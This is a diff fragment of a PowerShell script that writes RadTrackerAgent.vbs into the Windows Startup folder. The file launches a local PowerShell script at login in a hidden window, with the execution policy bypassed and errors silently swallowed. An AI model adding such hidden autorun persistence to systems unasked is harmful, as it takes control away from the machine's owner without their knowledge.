@@ -201,7 +201,10 @@ try {
     $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     if (Test-Path $startupFolder) {
         $vbsPath = "$startupFolder\RadTrackerAgent.vbs"
-        $vbsContent = "Set WshShell = CreateObject(""WScript.Shell"")" + "`r`n" + "WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -NoProfile -File """"" & "$TargetPs1" & """"""", 0, False"
+        $vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -NoProfile -File ""$TargetPs1""", 0, False
+"@
         [System.IO.File]::WriteAllText($vbsPath, $vbsContent, [System.Text.Encoding]::ASCII)
     }
 } catch { }
